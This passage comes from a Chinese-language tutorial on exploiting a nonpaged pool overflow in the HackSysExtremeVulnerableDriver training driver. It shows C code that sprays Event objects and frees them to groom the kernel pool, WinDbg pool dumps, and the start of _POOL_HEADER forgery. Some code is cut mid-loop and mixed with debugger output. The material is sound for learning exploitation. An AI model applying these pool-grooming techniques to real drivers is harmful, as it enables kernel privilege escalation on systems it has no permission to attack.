    88caac80  41414141 41414141 04040040 61546552
    88caac90  00000000 00000003 00000000 00000000
    88caaca0  00000000 00000000 00320004 44656c41
    88caacb0  884520c8 88980528 00000011 00000000
    88caacc0  01100802 00000080 760e0002 000029c7
    88caacd0  873e2ae0 873e2ae0 e702b9dd 00000000
    88caace0  00000164 00000000 00000000 00000001
    88caacf0  00000000 00000100 88caacb0 8969ae1b
## Event Object
从上面的池分布信息可以看到周围的池分布是很杂乱无章的，我们希望是能够控制我们内核池的分布，从源码中我们已经知道，我们的漏洞点是产生在非分页池中的，所以我们需要一个函数像malloc一样申请在我们的内核非分页池中，我们这里使用的是[`CreateEventA`](https://docs.microsoft.com/zh-cn/windows/win32/api/synchapi/nf-synchapi-createeventa)，函数原型如下
    HANDLE CreateEventA(
      LPSECURITY_ATTRIBUTES lpEventAttributes,
      BOOL                  bManualReset,
      BOOL                  bInitialState,
      LPCSTR                lpName
    );
该函数会生成一个[`Event`](https://docs.microsoft.com/zh-cn/windows/win32/sync/event-objects)事件对象，它的大小为 0x40 ，因为在刚才的调试中我们知道我们的池大小为 `0x1f8 + 8 =
0x200`，所以多次申请就刚好可以填满我们的池，如果把池铺满成我们的Event对象，我们再用[`CloseHandle`](https://docs.microsoft.com/zh-cn/windows/win32/api/handleapi/nf-handleapi-closehandle)函数释放一些对象，我们就可以在Event中间留出一些我们可以操控的空间，我们构造如下代码测试
    #include
    #include
    HANDLE hDevice = NULL;
    BOOL init()
    {
        // Get HANDLE
        hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL);
        printf("[+]Start to get HANDLE...\n");
        if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
        {
            return FALSE;
        }
        printf("[+]Success to get HANDLE!\n");
        return TRUE;
    }
    HANDLE spray_event[0x1000];
    VOID pool_spray()
    {
        for (int i = 0; i  !pool 0x86713A08
    Pool page 86713a08 region is Nonpaged pool
     86713000 size:   40 previous size:    0  (Allocated)  Even (Protected)
     86713040 size:   10 previous size:   40  (Free)       ....
     86713050 size:   48 previous size:   10  (Allocated)  Vad 
     86713098 size:   48 previous size:   48  (Allocated)  Vad 
     867130e0 size:   40 previous size:   48  (Allocated)  Even (Protected)
     86713120 size:   28 previous size:   40  (Allocated)  WfpF
     86713148 size:   28 previous size:   28  (Allocated)  WfpF
     86713170 size:  890 previous size:   28  (Free)       NSIk
    *86713a00 size:  200 previous size:  890  (Allocated) *Hack
            Owning component : Unknown (update pooltag.txt)
     86713c00 size:   40 previous size:  200  (Allocated)  Even (Protected)
     86713c40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713c80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713cc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713d00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713d40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713d80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713dc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713e00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713e40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713e80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713ec0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713f00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713f40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713f80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     86713fc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
接下来我们加上`CloseHandle`函数就可以制造一些空洞了
    VOID pool_spray()
    {
        for (int i = 0; i  !pool 0x8675AB88
    unable to get nt!ExpHeapBackedPoolEnabledState
    Pool page 8675ab88 region is Nonpaged pool
     8675a000 size:   40 previous size:    0  (Free)       Even
     8675a040 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a080 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a0c0 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a100 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a140 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a180 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a1c0 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a200 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a240 size:   40 previous size:   40  (Allocated)  Even (Protected)
     8675a280 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a2c0 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a300 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a340 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a380 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a3c0 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a400 size:   40 previous size:   40  (Free )  Even (Protected)
     8675a440 size:   40 previous size:   40  (Free)       Even
     8675a480 size:   40 previous size:   40  (Allocated)  Even (Protected)
     8675a4c0 size:  200 previous size:   40  (Free)       Even
     8675a6c0 size:   40 previous size:  200  (Allocated)  Even (Protected)
     8675a700 size:  200 previous size:   40  (Free)       Even
     8675a900 size:   40 previous size:  200  (Allocated)  Even (Protected)
     8675a940 size:  200 previous size:   40  (Free)       Even
     8675ab40 size:   40 previous size:  200  (Allocated)  Even (Protected)
    *8675ab80 size:  200 previous size:   40  (Allocated) *Hack
            Owning component : Unknown (update pooltag.txt)
     8675ad80 size:   40 previous size:  200  (Allocated)  Even (Protected)
     8675adc0 size:  200 previous size:   40  (Free)       Even
     8675afc0 size:   40 previous size:  200  (Allocated)  Even (Protected)
## 池头伪造
首先我们复习一下`x86 Kernel Pool`的池头结构`_POOL_HEADER`，`_POOL_HEADER`是用来管理pool
thunk的，里面存放一些释放和分配所需要的信息
    0: kd> dt nt!_POOL_HEADER
       +0x000 PreviousSize     : Pos 0, 9 Bits
       +0x000 PoolIndex        : Pos 9, 7 Bits
       +0x002 BlockSize        : Pos 0, 9 Bits
       +0x002 PoolType         : Pos 9, 7 Bits
       +0x000 Ulong1           : Uint4B
       +0x004 PoolTag          : Uint4B
       +0x004 AllocatorBackTraceIndex : Uint2B